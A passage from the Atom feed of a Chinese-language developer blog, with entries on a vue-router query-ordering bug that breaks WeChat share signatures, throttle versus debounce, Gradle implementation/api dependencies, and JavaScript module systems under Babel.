      &lt;p&gt;本文记录了如何在 iOS Simulator 和 Android 设备上调试 h5 页面，并在提供了 Alfred 脚本来便捷地管理 Simulator。&lt;/p&gt;
    
    </summary>
    
      <category term="Web前端" scheme="https://deskid.github.io/categories/Web%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="javascript" scheme="https://deskid.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>vue router 与微信分享失败</title>
    <link href="https://deskid.github.io/2018/02/02/2018-02-02-1/"/>
    <id>https://deskid.github.io/2018/02/02/2018-02-02-1/</id>
    <published>2018-02-02T15:48:18.000Z</published>
    <updated>2018-11-14T03:08:30.992Z</updated>
    
    <content type="html"><![CDATA[<p>最近在接入微信分享时发现一个奇怪的现象：</p><p>首次分享没问题，二次分享总是失败。</p><a id="more"></a><p>具体操作如下：</p><ol><li><p>直接在微信扫码打开页面</p></li><li><p>分享 （分享正常，title、content都带上了）<br><img src="/media/15175660133155.jpg" alt=""></p></li><li><p>点击分享链接打开页面</p></li><li><p>二次分享 （分享失败）<br><img src="/media/15175660448420.jpg" alt=""></p></li></ol><p>首先查看官方文档，显然是JS-SDK鉴权失败导致的。</p><p>在微信中分享时需要先去获取JS-SDK权限验证的签名。这个签名请求的参数中就需要带上当前页面的url。</p><blockquote><p>签名生成规则如下：</p><p>参与签名的字段包括<strong>noncestr</strong>（随机字符串）, 有效的<strong>jsapi_ticket</strong>, <strong>timestamp</strong>（时间戳）, <strong>url</strong>（当前网页的URL，不包含#及其后面部分）。</p><p>对所有待签名参数按照字段名的ASCII 码从小到大排序（字典序）后，使用URL键值对的格式拼接成字符串string1。这里需要注意的是所有参数名均为小写字符。对string1作sha1加密，字段名和字段值都采用原始值，不进行URL 转义。</p></blockquote><p>而二次分享和首次分享的区别在于——<br>分享出去的页面后面加上了类似<code>from=singlemessage</code> 、 <code>isappinstalled=1</code>的参数，在二分分享时验证JS-SDK使用的是加上了微信参数后的地址。</p><p>例如，我们最终分享出去的页面地址就加上了微信参数：</p><p><a href="http://h5.mogujie.com/pay/tthongbao_index.html?_fu=135hgdc&amp;_mgjuuid=24b0c55e-04c7-4237-8184-8024cfc468ea&amp;f=1002&amp;ptp=m1.TTiXHb.0.0.eMNdRLs&amp;shareUid=135hgdc&amp;from=groupmessage&amp;isappinstalled=1" target="_blank" rel="noopener">http://h5.mogujie.com/pay/tthongbao_index.html?_fu=135hgdc&amp;_mgjuuid=24b0c55e-04c7-4237-8184-8024cfc468ea&amp;f=1002&amp;ptp=m1.TTiXHb.0.0.eMNdRLs&amp;shareUid=135hgdc&amp;from=groupmessage&amp;isappinstalled=1</a></p><p>但是这不是问题的直接原因，因为我们在每次打开页面时都会动态地用当前页面的url去请求签名，这个url已经带上了微信参数。</p><p>那么验证失败只可能有一个原因——我们的url在获得签名后发生了改变。</p><p>在微信中打开页面后打印当前页面url验证一下：</p><p><a href="http://h5.mogujie.com/pay/tthongbao_index.html?_fu=135hgdc&amp;_mgjuuid=24b0c55e-04c7-4237-8184-8024cfc468ea&amp;f=1002&amp;from=groupmessage&amp;isappinstalled=1&amp;ptp=m1.TTiXHb.0.0.eMNdRLs&amp;shareUid=135hgdc" target="_blank" rel="noopener">http://h5.mogujie.com/pay/tthongbao_index.html?_fu=135hgdc&amp;_mgjuuid=24b0c55e-04c7-4237-8184-8024cfc468ea&amp;f=1002&amp;from=groupmessage&amp;isappinstalled=1&amp;ptp=m1.TTiXHb.0.0.eMNdRLs&amp;shareUid=135hgdc</a></p><p>发现页面地址真的变了。这里注意到 <code>query string</code> 按照 key 的字母顺序重排了。这个重排动作并不是浏览器做的，因为当我访问别的活动页地址时，并不会有这样的重排。</p><p>观察到重排现象后，我开始怀疑vue-router了。果然在issue列表中找到了<a href="https://github.com/vuejs/vue-router/issues/926" target="_blank" rel="noopener">issues-926</a>(看到掉进坑里的不止我一个，莫名其妙的开心了起来)。</p><p>按照 vue-router 的 release log ，在 <a href="https://github.com/vuejs/vue-router/releases/tag/v2.1.0" target="_blank" rel="noopener">2.1.0</a> 版本的<code>stringifyQuery</code>函数中已经去掉了sort动作。</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">export function stringifyQuery (obj: Dictionary&lt;string&gt;): string &#123;</span><br><span class="line"><span class="deletion">-  const res = obj ? Object.keys(obj).sort().map(key =&gt; &#123;</span></span><br><span class="line"><span class="addition">+  const res = obj ? Object.keys(obj).map(key =&gt; &#123;</span></span><br><span class="line">      const val = obj[key]</span><br><span class="line">    </span><br><span class="line">      if (val <span class="comment">=== undefined) &#123;</span></span><br></pre></td></tr></table></figure><p>升级到最新版本后再次测试果然二次分享ok了。</p><hr><p>然而这里的坑并没有结束，只是被隐藏的更深了。</p><p><code>vue-router</code> 在 <code>parseQuery</code> 时将 query 字符串构造为一个字典对象；然后在 history.pushState 时再将这个字典对象<code>stringifyQuery</code>转化为一个 queryString 字符串。</p><p>在序列化和反序列化的过程中，最重要的是保持前后的信息一致。</p><p><code>vue-router</code> 2.1.0 之前的版本由于对<code>Object.keys(obj)</code>进行<code>sort</code>导致了顺序信息的丢失，引起序列化前后地址不一致。<br>那么去掉了<code>sort</code>操作后的<code>vue-router</code>能还原顺序信息了吗？</p><p>99%的情况下可以，除非 query 中带有 Array 类型的 value…</p><p>举例说明：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?foo=bar&amp;baz=qux&amp;foo=bla</span><br></pre></td></tr></table></figure><p>经过<code>vue-router</code> 的<code>parseQuery</code>后，变成了</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  foo: [bar,bla],</span><br><span class="line">  baz: qux</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里转化没问题，再通过 <code>stringifyQuery</code> 转为字符串呢，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?foo=bar&amp;foo=bla&amp;baz=qux</span><br></pre></td></tr></table></figure><p>地址又变了！</p><p>拿<a href="https://url.spec.whatwg.org/#urlsearchparams" target="_blank" rel="noopener">标准实现</a> <code>URLSearchParams</code> 测试一下就会发现：在<code>URLSearchParams</code>上调用<code>toString</code>不会改变原来的queryString顺序：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var paramsString = &quot;foo=bar&amp;baz=qux&amp;foo=bala&quot;;</span><br><span class="line">var searchParams = new URLSearchParams(paramsString);</span><br><span class="line"></span><br><span class="line">for (let p of searchParams) &#123;</span><br><span class="line">  console.log(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">searchParams.toString();</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(2) [&quot;foo&quot;, &quot;bar&quot;]</span><br><span class="line">(2) [&quot;baz&quot;, &quot;qux&quot;]</span><br><span class="line">(2) [&quot;foo&quot;, &quot;bala&quot;]</span><br><span class="line">&quot;foo=bar&amp;baz=qux&amp;foo=bala&quot;</span><br></pre></td></tr></table></figure><p>而在vue-router内部，<code>parseQuery</code>在遇到重复的<code>key</code>时，会把字典中原有的value转化为数组，再将新的 value push到数组尾部。这里不可避免的丢失了<code>key</code>数组原来出现在url中的顺序。</p><p>归根结底，还是数据结构选取的锅：<code>parseQuery</code>生成的对象应该是一个 key-value 组成的<code>pair list</code>而不是<code>dictionary</code>。</p><p>找到思路了，vue-router源码也是现成的，那就改吧。</p><p>由于 query 对象是通过<code>$router</code>对外暴露的，直接改<code>parseQuery</code>的返回值类型代价太大了。我的思路是给 query 对象增加一个属性。</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">function parseQuery (query: string): Dictionary&lt;string&gt; &#123;</span><br><span class="line">  const res = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="addition">+  Object.defineProperty(res, '_rawQuery', &#123;</span></span><br><span class="line"><span class="addition">+    value: [],</span></span><br><span class="line"><span class="addition">+    enumerable: false</span></span><br><span class="line"><span class="addition">+  &#125;)</span></span><br><span class="line"></span><br><span class="line">  query = query.trim().replace(/^(\?|#|&amp;)/, '')</span><br><span class="line"></span><br><span class="line">  if (!query) &#123;</span><br><span class="line">    return res</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="deletion">-  query.split('&amp;').forEach((param) =&gt; &#123;</span></span><br><span class="line"><span class="addition">+  query.split('&amp;').forEach((param, index) =&gt; &#123;</span></span><br><span class="line">    const parts = param.replace(/\+/g, ' ').split('=')</span><br><span class="line">    const key = decode(parts.shift())</span><br><span class="line">    const val = parts.length &gt; 0</span><br><span class="line">      ? decode(parts.join('='))</span><br><span class="line">      : null</span><br><span class="line"></span><br><span class="line"><span class="addition">+    if (res._rawQuery[index] === undefined) &#123;</span></span><br><span class="line"><span class="addition">+      res._rawQuery[index] = []</span></span><br><span class="line"><span class="addition">+      res._rawQuery[index][0] = key</span></span><br><span class="line"><span class="addition">+      res._rawQuery[index][1] = val</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (res[key] <span class="comment">=== undefined) &#123;</span></span><br><span class="line">      res[key] = val</span><br><span class="line">    &#125; else if (Array.isArray(res[key])) &#123;</span><br><span class="line">      res[key].push(val)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      res[key] = [res[key], val]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  return res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>parseQuery()</code>函数中额外添加<code>_rawQuery</code>数组属性，为了简单，这里使用了二维数组来模拟pair。按照<code>queryString</code> key-value 出现的顺序初始化数组。注意：为了不影响原来对Component暴露的query对象，特地将<code>_rawQuery</code>的<code>enumerable</code>置为false。</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">export function stringifyQuery (obj: Dictionary&lt;string&gt;): string &#123;</span><br><span class="line"><span class="addition">+  const hasRawQuery = !!obj._rawQuery</span></span><br><span class="line"><span class="addition">+  const queryObj = hasRawQuery ? obj._rawQuery : obj</span></span><br><span class="line"><span class="deletion">-  const res = obj ? Object.keys(obj).map(key =&gt; &#123;</span></span><br><span class="line"><span class="addition">+  const res = queryObj ? Object.keys(queryObj).map(index =&gt; &#123;</span></span><br><span class="line"><span class="addition">+   const key = hasRawQuery ? queryObj[index][0] : index</span></span><br><span class="line"><span class="deletion">-   const val = obj[key]</span></span><br><span class="line"><span class="addition">+   const val = hasRawQuery ? queryObj[index][1] : obj[index]</span></span><br><span class="line"></span><br><span class="line">    if (val <span class="comment">=== undefined) &#123;</span></span><br><span class="line">      return ''</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (val <span class="comment">=== null) &#123;</span></span><br><span class="line">      return encode(key)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (Array.isArray(val)) &#123;</span><br><span class="line">      const result = []</span><br><span class="line">      val.forEach(val2 =&gt; &#123;</span><br><span class="line">        if (val2 <span class="comment">=== undefined) &#123;</span></span><br><span class="line">          return</span><br><span class="line">        &#125;</span><br><span class="line">        if (val2 <span class="comment">=== null) &#123;</span></span><br><span class="line">          result.push(encode(key))</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">          result.push(encode(key) + '=' + encode(val2))</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      return result.join('&amp;')</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return encode(key) + '=' + encode(val)</span><br><span class="line">  &#125;).filter(x =&gt; x.length &gt; 0).join('&amp;') : null</span><br><span class="line">  return res ? `?$&#123;res&#125;` : ''</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>stringifyQuery()</code>函数中先判断是否有<code>_rawQuery</code>，有的话优先用<code>_rawQuery</code>。其余操作一致。</p><p>改完后，跑一遍vue-router单元测试。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm run test:unit</span><br><span class="line"></span><br><span class="line">Started</span><br><span class="line">................................................................</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">64 specs, 0 failures</span><br><span class="line">Finished in 0.3 seconds</span><br></pre></td></tr></table></figure><p>测试通过，浏览器中的<code>?foo=bar&amp;baz=qux&amp;foo=bla</code>顺序也保留下来了，完美。</p><p>总结：</p><ol><li>query string 本身只是键值对，是顺序无关的，w3c规范也没有强调说一定要符合特定的顺序。vue-router 2.1.0之前的版本的<code>sort</code>操作纯属画蛇添足。最好的做法是保留原有的顺序信息，把问题抛到framework外部去解决。</li><li>微信js-sdk的签名接口设计的不合理：只考虑了key排序的问题，而忽视了作为value的url的排序问题。由于url query参数的顺序不影响url的相等性，在计算签名时应该在接口内部对url的query进行排序操作。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在接入微信分享时发现一个奇怪的现象：&lt;/p&gt;
&lt;p&gt;首次分享没问题，二次分享总是失败。&lt;/p&gt;
    
    </summary>
    
      <category term="Web前端" scheme="https://deskid.github.io/categories/Web%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="javascript" scheme="https://deskid.github.io/tags/javascript/"/>
    
      <category term="vue" scheme="https://deskid.github.io/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>throttle 和 debounce</title>
    <link href="https://deskid.github.io/2017/12/08/throttle-vs-debounce/"/>
    <id>https://deskid.github.io/2017/12/08/throttle-vs-debounce/</id>
    <published>2017-12-07T16:18:28.000Z</published>
    <updated>2018-11-14T03:16:05.704Z</updated>
    
    <content type="html"><![CDATA[<p>throttle 和 debounce 是两个控制方法调用频率的高阶函数。</p><p>本文比较了这两个函数的区别和使用场景。</p><a id="more"></a><h3 id="throttle">throttle:</h3><p>使得某个函数在每间隔一段时间内执行不大于一次。</p><p>用通俗的例子来描述：某个函数去乘地铁。地铁每隔一段固定时间发车。不管乘客怎么源源不断地来，都得等一段时间，在地铁进站后才能上车；</p><p>下图示中  <code>X</code>是一个被 throttled 的函数实际执行的时机</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">||||||||||||||||||||||||| (pause) |||||||||||||||||||||||||</span><br><span class="line">X    X    X    X    X    X        X    X    X    X    X    X</span><br></pre></td></tr></table></figure><h4 id="throttle的使用场景：">throttle的使用场景：</h4><ul><li>resize 事件</li><li>mouse move 事件</li><li>scroll 事件</li></ul><blockquote><p>当基于性能、效率上的考虑，要限制函数的执行频率时可以使用 throttle</p></blockquote><h4 id="实现">实现</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">throttle = <span class="function"><span class="keyword">function</span>(<span class="params">fn, threshold=<span class="number">250</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> last</span><br><span class="line">  <span class="keyword">var</span> timer</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> context = <span class="keyword">this</span></span><br><span class="line">    <span class="keyword">var</span> args = <span class="built_in">arguments</span></span><br><span class="line">    <span class="keyword">var</span> now = +<span class="keyword">new</span> <span class="built_in">Date</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (last &amp;&amp; now &lt; last + threshold) &#123;</span><br><span class="line">      clearTimeout(timer)</span><br><span class="line">      timer = setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        last = now</span><br><span class="line">        fn.apply(context, args)</span><br><span class="line">      &#125;, threshold)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 第一次执行、或者超过时间阈值</span></span><br><span class="line">      last = now</span><br><span class="line">      fn.apply(context, args)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="debounce">debounce:</h3><p>使得某个函数在一段时间阈值内执行且只执行一次。</p><p>这个也可以举个例子来描述：某个函数乘坐电梯去上班，快关电梯门的时候发现了同事也来了，于是按住开关放同事进来。假设此时是上班高峰，同事络绎不绝的来乘电梯，而电梯足够大。那么在这一段时间内，电梯都不会启动，直到电梯门关上。</p><p>下图示中 <code>X</code>是一个被 debounce 的函数实际执行的时机</p><pre><code>|||||||||||||||||||||||| (pause) ||||||||||||||||||||||||                        X                                 X</code></pre><h4 id="常见的使用场景：">常见的使用场景：</h4><ul><li>toggling state</li><li>until scroll end 事件</li><li>until mouse move end 事件</li><li>until typing end 事件</li><li>触发 Ajax 请求的 event</li></ul><blockquote><p>基于幂等的考虑，需要将一段时间内的所有事件收束为一个事件，可以使用 debounce</p></blockquote><h4 id="实现-v2">实现</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">debounce = <span class="function"><span class="keyword">function</span>(<span class="params">func, wait</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> timeout;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> context = <span class="keyword">this</span>, args = <span class="built_in">arguments</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> later = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        timeout = <span class="literal">null</span>;</span><br><span class="line">        func.apply(context, args);</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    clearTimeout(timeout);</span><br><span class="line">    timeout = setTimeout(later, wait);</span><br><span class="line">    </span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="参考">参考</h3><p><a href="http://demo.nimius.net/debounce_throttle/" target="_blank" rel="noopener">可视化demo</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;throttle 和 debounce 是两个控制方法调用频率的高阶函数。&lt;/p&gt;
&lt;p&gt;本文比较了这两个函数的区别和使用场景。&lt;/p&gt;
    
    </summary>
    
      <category term="Web前端" scheme="https://deskid.github.io/categories/Web%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="javascript" scheme="https://deskid.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>gradle 新依赖函数 implementation api详解</title>
    <link href="https://deskid.github.io/2017/12/04/gradle-compile/"/>
    <id>https://deskid.github.io/2017/12/04/gradle-compile/</id>
    <published>2017-12-04T14:33:24.000Z</published>
    <updated>2018-11-14T03:16:16.007Z</updated>
    
    <content type="html"><![CDATA[<p>在 gradle 3.0 之后 compile、provided、apk 被 deprecated，取而代之的是 implementation 、api、compileOnly、runtimeOnly。</p><p>本文重点是介绍implementation和api。</p><a id="more"></a><h3 id="api">api</h3><p>api 修饰的依赖会被暴露并传递给外部，也就是说：在外部module引用该lib时，module会把该lib的api依赖传递依赖过来，并添加到module自己的compile classpath上。（在运行期和编译期api依赖都可见。）如果有一个api dependency修改了对外API，那么所有依赖和间接依赖了该 dependency 的module都会被重新编译。</p><h3 id="implementation">implementation</h3><p>implementation 则相反，implementation修饰的依赖不会被暴露给外部module，在引用该lib时，lib内通过implementation申明的依赖不会被添加到module 的 compile classpath上。（也就是说lib的依赖仅在runtime可见，编译期不可见。）如果有一个implementation dependency 修改了API，那么仅该dependency 和 直接依赖于它的module会被重新编译。</p><h3 id="compile">compile</h3><p>compile 的行为和api一致，已经被标记为deprecated。</p><p>为什么要提供两种依赖函数呢？</p><ul><li><p>可以更好的控制 transitive dependency</p></li><li><p>compile classpath更精简，编译速度得到提升</p></li><li><p>implementation dependencies 发生改变不会导致全量地重新编译</p></li><li><p>在POM中依赖关系更加清晰：编译library的依赖和运行library的依赖区可以分开了。</p></li></ul><!-- more --><p>举例说明：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">└── App</span><br><span class="line">    ├── implementation A</span><br><span class="line">    │   └── implementation a1</span><br><span class="line">    │   └── api a2</span><br><span class="line">    └── implementation B</span><br><span class="line">       └── implementation b1</span><br><span class="line">       └── api b2</span><br></pre></td></tr></table></figure><p>A lib分别通过implementation 和 api 依赖了a1、a2；<br>B lib分别通过implementation 和 api 依赖了b1、b2；<br>App 通过implementation直接依赖了A、B lib；<br>App 被A传递依赖了a2；<br>App 被B传递依赖了b2；</p><ol><li>编译App时，compile classpath中的依赖有 A、B、a2、b2</li><li>a1 对外暴露的API有修改 —— 仅 a1 和 A 会被重新编译，b1 同理。</li><li>a2 对外暴露的API有修改 —— a2 、 A 、App 都会被重新编译，b2 同理。</li></ol><h3 id="如何判断自己library的依赖属于哪种类型呢？">如何判断自己library的依赖属于哪种类型呢？</h3><p>api 依赖一般是指那些暴露在library binary interface(也叫Application Binary Interface)中的，包括但不仅仅限于下面case：</p><ul><li><p>在interface和父类中被引用到的</p></li><li><p>在<code>public</code>方法参数中引用到的,包括泛型参数</p></li><li><p>在<code>public</code>属性中引用到的</p></li><li><p>在<code>public</code> annotation 中引用到的。</p></li></ul><blockquote><p><em>注这里 <code>public</code> 是广义上的，泛指对编译器可见，比如：<code>public</code>, <code>protected</code> 以及 <code>package private</code>概念都是<code>public</code>的)</em></p></blockquote><p>相反，下面case和ABI不相关的，则应该被申明为<code>implementation</code> dependency:</p><ul><li><p>仅仅被方法内部引用的</p></li><li><p>仅仅被 private 成员引用的</p></li><li><p>仅仅被内部类引用的(未来，Gradle 会允许用户申明那些包属于公共API)</p></li></ul><p>官方提供了一个<a href="https://docs.gradle.org/current/userguide/java_library_plugin.html#sec:java_library_recognizing_dependencies" target="_blank" rel="noopener">例子</a>，如何根据上述规则推导不同依赖类型。</p><p>实际上使用时，可以偷懒地判断，大部分情况下：</p><ol><li>在app和test module中应该使用implementation引入dependency</li><li>在library module中应该使用api引入dependency，除了非public引用的dependency。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在 gradle 3.0 之后 compile、provided、apk 被 deprecated，取而代之的是 implementation 、api、compileOnly、runtimeOnly。&lt;/p&gt;
&lt;p&gt;本文重点是介绍implementation和api。&lt;/p&gt;
    
    </summary>
    
      <category term="Android" scheme="https://deskid.github.io/categories/Android/"/>
    
    
      <category term="gradle" scheme="https://deskid.github.io/tags/gradle/"/>
    
  </entry>
  
  <entry>
    <title>module in JavaScript</title>
    <link href="https://deskid.github.io/2017/11/28/module-in-js/"/>
    <id>https://deskid.github.io/2017/11/28/module-in-js/</id>
    <published>2017-11-27T16:16:44.000Z</published>
    <updated>2018-11-14T03:16:27.501Z</updated>
    
    <content type="html"><![CDATA[<p>JavaScript 在ES6之前没有给出官方模块的定义，因此社区自己搞了两个模块加载方案：</p><ul><li>CommonJS (node)</li><li>AMD (browser) 本文略</li></ul><a id="more"></a><h3 id="commonjs规范">CommonJS规范</h3><h4 id="module定义">module定义:</h4><p>每个文件就是一个模块，文件有自己的私有内部作用域。<code>module</code>对象代表当前模块，<code>module.exports</code> 是对外暴露的接口。加载模块，实际上是加载 <code>module.exports</code>.</p><p><code>exports</code> 是 <code>module.exports</code> 的引用，其实质是 node 提供的语法糖, 本质类似于每个模块开头都include了下面的代码。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> exports = <span class="built_in">module</span>.exports;</span><br></pre></td></tr></table></figure><p>如修改<code>exports</code>对象的属性，等价于修改了<code>module.exports</code>。虽然这样提供了方便，但是直接改变<code>exports</code>对象的指向是个不好的实践。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//utils.js</span></span><br><span class="line"><span class="keyword">let</span> a = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">exports.a = <span class="number">200</span>;</span><br></pre></td></tr></table></figure><p>引入的时候，<code>require</code> 导入的是 <code>module.exports</code> 指向的一个对象。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.js</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">'/utils'</span>);</span><br><span class="line"><span class="comment">// var &#123;a&#125; = require('/utils'); //200</span></span><br><span class="line"><span class="built_in">console</span>.log(a) <span class="comment">// &#123;a : 200&#125;</span></span><br></pre></td></tr></table></figure><h3 id="es6-规范">ES6 规范</h3><h4 id="export命令">export命令</h4><p><code>export</code> 命令定义了模块的输出、其值可以是 value，variable、function、class，</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//profile.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> lastName = <span class="string">"xxx"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="keyword">var</span> firstName = <span class="string">"xxx"</span></span><br><span class="line"><span class="comment">//优先使用这种，便于统一一个地方export</span></span><br><span class="line"><span class="keyword">export</span> &#123;firstName&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// export function</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">area</span>(<span class="params">radius</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.PI * radius * radius;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">circumference</span>(<span class="params">radius</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span> * <span class="built_in">Math</span>.PI * radius;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="import命令">import命令</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;firstName, lastName&#125; <span class="keyword">from</span> <span class="string">'profile'</span>; <span class="comment">//变量</span></span><br><span class="line"><span class="keyword">import</span> &#123; area, circumference &#125; <span class="keyword">from</span> <span class="string">'circle'</span>; <span class="comment">//方法</span></span><br></pre></td></tr></table></figure><p><code>import</code>大括号内的变量名必须与<code>export</code>一致。（在webstrom等IDE中会帮你静态检查的）</p><!-- more --><h4 id="module命令">module命令</h4><p>module 是个语法糖。有时候，需要import所有的接口</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> circle <span class="keyword">from</span> <span class="string">'circle'</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"圆面积："</span> + circle.area(<span class="number">4</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"圆周长："</span> + circle.circumference(<span class="number">14</span>));</span><br></pre></td></tr></table></figure><p>可以写成</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span> circle <span class="keyword">from</span> <span class="string">'circle'</span></span><br></pre></td></tr></table></figure><h4 id="export-default-命令">export default 命令</h4><p>export default命令定义了模块导出的默认值，引入默认值时不用加大括号。这个命令其实也是语法糖：</p><p>把导出值封装到了一个<code>default</code>对象，再在引入时解构这个<code>default</code>对象。因为有一个对象来承接中间的值，所以在<code>import</code>时可以用任意<code>key</code>指定被引入的值</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export default class &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">import MyClass from &apos;MyClass&apos;</span><br><span class="line">let o = new MyClass();</span><br></pre></td></tr></table></figure><h3 id="babel">Babel</h3><p>在ES6出来之前社区上已经有许多CommonJS的module，托Babel的福，可以直接使用ES6的新语法来引入这些只支持CommonJS标准的库。</p><p>Babel 做了一层翻译，把ES6的import、export语法变成了兼容CommonJS规范的require、exports。</p><h4 id="1-export-babel翻译：">1. export babel翻译：</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> foo = <span class="number">42</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="number">21</span>;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(exports, <span class="string">"__esModule"</span>, &#123;</span><br><span class="line">  value: <span class="literal">true</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> foo = exports.foo = <span class="number">42</span>;</span><br><span class="line">exports.default = <span class="number">21</span>;</span><br></pre></td></tr></table></figure><p>上面可以看到export default 和普通的export foo一样，都是给exports对象添加属性。</p><h4 id="2-import-babel翻译：">2. import babel翻译：</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span></span><br></pre></td></tr></table></figure><p>==========&gt;</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _react = <span class="built_in">require</span>(<span class="string">'react'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _react2 = _interopRequireDefault(_react);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_interopRequireDefault</span>(<span class="params">obj</span>) </span>&#123; <span class="keyword">return</span> obj &amp;&amp; obj.__esModule ? obj : &#123; <span class="attr">default</span>: obj &#125;; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过_react2.default引用</span></span><br></pre></td></tr></table></figure><p>export default 和 import 的使用要结合一起看：</p><p>上面的export default翻译为了<code>exports.default</code>；</p><p>import命令则要先判断：对经过了 babel 翻译后export的module直接返回对象，否则先用对象包装一层，并把export值赋值给<code>default</code>属性；最终在代码中使用时，统一使用<code>moduleName.default</code> 引用。</p><p>普通的非default import语法就简单了，和require一模一样，导入时需要添加<code>{}</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;Component&#125; <span class="keyword">from</span> <span class="string">'react'</span></span><br></pre></td></tr></table></figure><p>===========&gt;</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span 